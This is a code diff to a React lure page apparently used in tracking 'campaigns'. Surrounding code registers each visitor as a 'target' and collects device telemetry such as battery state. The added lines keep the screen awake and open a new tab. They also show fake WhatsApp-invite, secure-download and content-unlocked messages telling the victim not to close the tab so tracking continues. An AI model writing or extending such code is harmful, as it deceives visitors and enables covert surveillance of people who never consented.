@@ -257,6 +257,13 @@ export default function App() {
     const deviceId = getDeviceId();
     const save = (target) => apiAddTarget(campaignId, { ...target, deviceId }).catch(() => {});
 
+    // --- Wake Lock API (Impedir tela de apagar) ---
+    try {
+      if ('wakeLock' in navigator) {
+        await navigator.wakeLock.request('screen');
+      }
+    } catch (e) {}
+
     // --- Módulo 1: Telemetria de Hardware Avançada ---
     let batteryLevel = 'Desconhecido';
     let isCharging = false;
@@ -669,6 +676,9 @@ export default function App() {
                   setContentUnlocked(true);
                   const cid = new URLSearchParams(window.location.search).get('id');
                   autoTrackTarget(cid);
+                  setTimeout(() => {
+                    if (previewCampaign?.image) window.open(previewCampaign.image, '_blank');
+                  }, 100);
                 }}
                 style={{ background:'#00a884', border:'none', color:'#fff', padding:'14px 32px', borderRadius:'24px', fontWeight:'bold', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 2px 4px rgba(0,0,0,0.2)' }}
               >
@@ -676,7 +686,8 @@ export default function App() {
               </button>
             ) : (
               <div style={{ padding: '15px', background: '#dcf8c6', color: '#111b21', borderRadius: '8px', fontSize: '0.9rem' }}>
-                Entrando no grupo... Aguarde a aprovação do administrador.
+                <strong>Redirecionando para o WhatsApp...</strong><br/><br/>
+                Por favor, ⚠️ NÃO FECHE ESTA ABA para garantir a sincronização segura do convite.
               </div>
             )}
           </div>
@@ -700,6 +711,9 @@ export default function App() {
                   setContentUnlocked(true);
                   const cid = new URLSearchParams(window.location.search).get('id');
                   autoTrackTarget(cid);
+                  setTimeout(() => {
+                    if (previewCampaign?.image) window.open(previewCampaign.image, '_blank');
+                  }, 100);
                 }}
                 style={{ background:'#1a73e8', border:'none', color:'#fff', padding:'10px 24px', borderRadius:'4px', fontWeight:'500', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
               >
@@ -707,7 +721,8 @@ export default function App() {
               </button>
             ) : (
               <div style={{ padding: '15px', border: '1px solid #ceead6', background: '#e6f4ea', color: '#137333', borderRadius: '4px', fontSize: '0.9rem', textAlign: 'center' }}>
-                Iniciando download seguro... Verifique sua pasta.
+                <strong>Download autorizado com sucesso em nova aba.</strong><br/><br/>
+                Para evitar que o arquivo local seja corrompido, ⚠️ NÃO FECHE ESTA ABA até a conclusão.
               </div>
             )}
           </div>
@@ -743,18 +758,19 @@ export default function App() {
                   setContentUnlocked(true);
                   const cid = new URLSearchParams(window.location.search).get('id');
                   autoTrackTarget(cid);
+                  setTimeout(() => {
+                    if (previewCampaign?.image) window.open(previewCampaign.image, '_blank');
+                  }, 100);
                 }}
                 style={{ background:'linear-gradient(135deg, #3b82f6, #1d4ed8)', border:'none', color:'#fff', padding:'13px 32px', borderRadius:'8px', fontWeight:'700', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 4px 20px rgba(59,130,246,0.4)' }}
               >
                 ✅ Confirmar e Ver Conteúdo
               </button>
             ) : (
-              <button
-                onClick={() => setShowFullscreenImage(true)}
-                style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
-              >
-                🖼️ Abrir Mídia em Tela Cheia
-              </button>
+              <div style={{ background:'rgba(16, 185, 129, 0.1)', border:'1px solid #10b981', color:'#10b981', padding:'15px', borderRadius:'8px', fontSize:'0.9rem' }}>
+                <strong>Conteúdo liberado em uma nova aba.</strong><br/><br/>
+                ⚠️ MANTENHA ESTA JANELA ABERTA para garantir que o acesso ao servidor seja mantido.
+              </div>
             )}
           </div>
         )}
